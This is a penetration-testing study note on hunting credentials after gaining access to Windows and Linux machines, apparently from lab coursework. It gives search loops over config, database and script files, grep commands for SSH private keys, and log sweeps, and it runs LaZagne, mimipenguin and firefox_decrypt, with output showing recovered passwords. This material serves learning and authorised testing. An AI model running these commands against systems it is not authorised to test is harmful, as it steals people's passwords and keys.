---
title: Credential Hunting
draft: false
tags:
---
## On Windows

After we gain access to the target windows machine, we can move on to hunting for credential on system. 

## Key Terms to Search for

|               |              |             |
| ------------- | ------------ | ----------- |
| Passwords     | Passphrases  | Keys        |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |

## Methods
### Search Tool

Use Windows Search to find files with keywords. 

### Lazagne.exe

Searches for creds on browsers or installed applications. 

```cmd-session
C:\Users\bob\Desktop> start lazagne.exe all -vv
```

### findstr

```cmd-session
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## References
- https://github.com/AlessandroZ/LaZagne/releases/


## On Linux

Files to look for:

|   |   |   |
|---|---|---|
|Configuration files|Databases|Notes|
|Scripts|Cronjobs|SSH keys|

## Conf files

Search for configuration files on the system:

```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

Search for keywords (user, password,pass) inside the found configuration files:

```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

## DB Files

Search for database files on the system:

```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

## Notes

Search for Notes on the system:

```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```


## Scripts

Look for different scripts on the system:

```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```


## Cronjobs

Cronjobs are located at /etc/crontab.

```
ls -la /etc/cron.*
```

## SSH Keys

SSH Keys can be named arbitrarily but the format is always unique, especially the first line. 

### Private Keys

```shell-session
jadu101@ubuntu:~$ grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

### Public Keys

```shell-session
jadu101@ubuntu:~$ grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK
```

## History

Files such as `.bash_history`, `.bashrc`, `,bash_profile`.


## Logs

|**Log File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|
```shell
jadu101@ubuntu:~$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

#### Log file:  /var/log/dpkg.log.1
2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none> 
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...
```


## Memory and Cache

Many applications and processes needs creds for authentication. 

We can use [mimipenguin](https://github.com/huntergregal/mimipenguin)to retrieve this type of credentials. 

```shell-session
jadu101@ubuntu:~$ sudo python3 mimipenguin.py
[sudo] password for jadu101: 

[SYSTEM - GNOME]	jadu101:WLpAEXFa0SbqOHY


jadu101@ubuntu:~$ sudo bash mimipenguin.sh 
[sudo] password for jadu101: 

MimiPenguin Results:
[SYSTEM - GNOME]          jadu101:WLpAEXFa0SbqOHY
```

Even more powerful tool is **LaZagne**. 

```shell-session
jadu101@ubuntu:~$ sudo python2.7 laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::
```

## Browsers

For Firefox, credentials are in **logins.json**.

```shell-session
jadu101@ubuntu:~$ ls -l .mozilla/firefox/ | grep default 

drwx------ 11 jadu101 jadu101 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 jadu101 jadu101 4096 Jan 28 13:30 lfx3lvhb.default
```


We can use [Firefox Decrypt](https://github.com/unode/firefox_decrypt)to decrypt firefox credentials. 

```shell-session
jadu101@htb[/htb]$ python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'
```


We can use LaZagne as well:

```shell-session
jadu101@ubuntu:~$ python3 laZagne.py browsers

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test
```


